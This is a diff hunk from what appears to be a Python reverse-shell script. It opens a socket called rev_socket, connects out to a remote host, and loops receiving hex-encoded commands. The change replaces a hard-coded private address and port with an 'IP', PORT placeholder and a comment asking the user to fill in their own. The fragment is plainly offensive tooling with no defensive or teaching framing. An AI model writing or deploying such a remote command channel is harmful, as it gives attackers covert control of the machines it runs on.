@@ -26,7 +26,7 @@ def hex_handler(text, encode=False, decode=False):
     return new_text
 
 rev_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-rev_socket.connect(('192.168.1.10', 8080))
+rev_socket.connect(('IP', PORT)) # Set IP and port on this line.
 
 while True:
     command = hex_handler(rev_socket.recv(1024), decode=True)
